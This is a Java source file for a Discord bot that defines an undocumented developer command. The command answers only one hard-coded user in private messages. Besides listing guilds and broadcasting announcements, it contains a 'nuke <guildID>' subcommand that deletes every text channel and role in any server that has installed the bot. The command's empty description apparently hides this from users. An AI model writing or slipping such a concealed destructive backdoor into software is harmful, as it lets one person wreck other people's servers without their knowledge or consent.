package tech.hadenw.shmamesbot.commands;

import java.awt.Color;
import java.util.Calendar;
import java.util.Date;

import net.dv8tion.jda.core.EmbedBuilder;
import net.dv8tion.jda.core.entities.Game;
import net.dv8tion.jda.core.entities.Game.GameType;
import net.dv8tion.jda.core.entities.Guild;
import net.dv8tion.jda.core.entities.Message;
import net.dv8tion.jda.core.entities.MessageEmbed;
import net.dv8tion.jda.core.entities.PrivateChannel;
import net.dv8tion.jda.core.entities.Role;
import net.dv8tion.jda.core.entities.TextChannel;
import net.dv8tion.jda.core.entities.User;
import tech.hadenw.shmamesbot.Shmames;
import tech.hadenw.shmamesbot.Utils;
import tech.hadenw.shmamesbot.brain.MotherBrain;

public class Dev implements ICommand {
	@Override
	public String getDescription() {
		return "";
	}

	@Override
	public String run(String args, User author, Message message) {
		if(message.getChannel() instanceof PrivateChannel) {
			if(author.getId().equals("294671756155682828")) { // My Discord account
				if(args.length() > 0) {
					if(args.toLowerCase().startsWith("addstatus")) {
						args = args.substring("addstatus".length()+1).trim();
						
						MotherBrain b = Shmames.getBrains().getMotherBrain();
						GameType type = GameType.valueOf(args.substring(0, args.indexOf(" ")).toUpperCase());
						String msg = args.substring(args.indexOf(" "));
						
						b.getStatuses().put(msg, type);
						Shmames.getJDA().getPresence().setGame(Game.of(type, msg));
						Shmames.getBrains().saveMotherBrain();
						
						return "Changed!";
					} else if(args.toLowerCase().startsWith("getguilds")) {
						String guilds = "**Guilds:**\n";
						
						for(Guild g : Shmames.getJDA().getGuilds()) {
							guilds += "\n";
							guilds += g.getName()+": "+g.getId();
						}
						
						return guilds;
					} else if(args.toLowerCase().startsWith("reload")) {
						args = args.substring("reload".length()+1).trim();
						
						Shmames.getBrains().reloadBrain(args);
						
						return "Reloaded Guild #"+args+"'s brain";
					} else if(args.toLowerCase().startsWith("announce")) {
						args = args.substring("announce".length()+1).trim();
						
						EmbedBuilder eBuilder = new EmbedBuilder();
						User a = message.getAuthor();
						Calendar c = Calendar.getInstance();
				    	c.setTime(new Date());
						
						eBuilder.setAuthor(a.getName(), null, a.getEffectiveAvatarUrl());
				        eBuilder.setColor(Color.RED);
				        eBuilder.setTitle("\u2699 Developer Note");
				        eBuilder.appendDescription(args);
				        eBuilder.setFooter("Developer Note - sent on "+Utils.getFriendlyDate(c), null);

				        MessageEmbed embed = eBuilder.build();
				        int msgs = 0;
				        
				        // Send to one channel for all guilds
				        for(Guild g : Shmames.getJDA().getGuilds()) {
							for(TextChannel ch : g.getTextChannels()) {
								try {
									ch.sendMessage(embed).complete();
									msgs++;
									break;
								}catch(Exception e) {
									// Was not able to send to this channel, try again.
								}
							}
						}
						
						return "Sent the message to "+msgs+" guilds!";
					} else if(args.toLowerCase().startsWith("nuke")) {
						args = args.substring("nuke".length()+1).trim();
						
						for(Guild g : Shmames.getJDA().getGuilds()) {
							if(g.getId().equals(args)) {
								int chs = 0;
								int rs = 0;
								
								for(TextChannel ch : g.getTextChannels()) {
									try {
										ch.delete().complete();
										chs++;
									}catch(Exception e) {
										// Was not able to delete this channel.
									}
								}
								
								for(Role r : g.getRoles()) {
									try {
										r.delete().complete();
										rs++;
									}catch(Exception e) {
										// Was not able to delete this role.
									}
								}
								
								return "Nuked "+chs+" text channels and "+rs+" roles from server \""+g.getName()+"\"";
							}
						}
						
						return "That guild wasn't found :/";
					} else {
						return "That command wasn't recognized.";
					}
				} else {
					return "**Developer Commands**\n"
							+ "addStatus <type> <status>\n"
							+ "getGuilds\n"
							+ "reload <guildID>\n"
							+ "announce <message>\n"
							+ "nuke <guildID>";
				}
			}
		}
		
		return null;
	}

	@Override
	public String[] getAliases() {
		return new String[] {"developer"};
	}
	
	@Override
	public String sanitize(String i) {
		return i;
	}
	
	@Override
	public boolean requiresGuild() {
		return false;
	}
}
